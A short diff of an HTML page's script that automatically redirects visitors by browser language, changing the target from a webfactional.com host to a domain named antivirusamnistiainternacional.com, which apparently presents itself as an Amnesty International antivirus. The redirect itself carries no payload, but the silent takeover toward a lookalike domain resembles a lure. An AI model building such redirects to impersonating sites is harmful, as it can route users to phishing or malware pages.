@@ -5,9 +5,9 @@
 	<script type="text/javascript">
 		var userLang = navigator.language || navigator.userLanguage; 
 		if(userLang.includes("es")){
-			window.open("https://waldoh.webfactional.com/app_es.php", "_top"); 
+			window.open("https://antivirusamnistiainternacional.com/app_es.php", "_top"); 
 		}else{
-			window.open("https://waldoh.webfactional.com/app_en.php", "_top"); 
+			window.open("https://antivirusamnistiainternacional.com/app_en.php", "_top"); 
 		}
 	</script>
 </head>
